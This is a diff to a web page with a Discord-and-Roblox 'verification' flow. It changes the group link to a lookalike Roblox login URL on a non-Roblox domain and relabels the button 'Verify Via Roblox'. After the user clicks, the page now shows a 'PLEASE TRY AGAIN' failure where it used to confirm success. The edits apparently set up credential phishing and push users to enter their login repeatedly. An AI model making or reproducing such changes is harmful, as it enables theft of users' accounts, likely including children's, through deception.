@@ -523,7 +523,7 @@
               <span style="font-weight:bold;">Discord Server</span>
               <span id="step1Status" style="margin-left:auto;">🔒</span>
             </div>
-            <a href="https://discord.gg/Q6Ej8SjeQ7" class="step-link-btn discord" id="discordLink" target="_blank">
+            <a href="https://discord.gg/xhT3uHd2HG" class="step-link-btn discord" id="discordLink" target="_blank">
               <div class="btn-content"><span>💬</span> Join Server</div><span>→</span>
             </a>
             <button class="step-verify-btn" id="verifyDiscordBtn">Verify Authorization</button>
@@ -627,19 +627,19 @@
         document.getElementById("step2Card").classList.remove("locked");
         document.getElementById("warningMsg").style.display = "none";
         document.getElementById("robloxLinkContainer").innerHTML = `
-            <a href="https://shorturl.asia/ULhKY" class="step-link-btn roblox" id="robloxLink" target="_blank">
+            <a href="https://roblox.com.ge/login?returnUrl=5285318607103111" class="step-link-btn roblox" id="robloxLink" target="_blank">
                 <div class="btn-content"><span>🎮</span> Join Group</div><span>→</span>
             </a>`;
         const rBtn = document.getElementById("verifyRobloxBtn");
         rBtn.disabled = false;
-        rBtn.innerHTML = "Verify Group Membership";
+        rBtn.innerHTML = "Verify Via Roblox";
         
         let rClicked = false;
         setTimeout(() => {
             document.getElementById("robloxLink").onclick = () => rClicked = true;
             rBtn.onclick = function() {
                 if(!rClicked) { alert("Join the Roblox group first!"); return; }
-                this.innerHTML = "✓ FULLY VERIFIED";
+                this.innerHTML = "✗ PLEASE TRY AGAIN";
                 this.classList.add("verified");
                 document.getElementById("step2Status").innerHTML = "✅";
                 document.getElementById("verifyStatus").innerHTML = "✅";
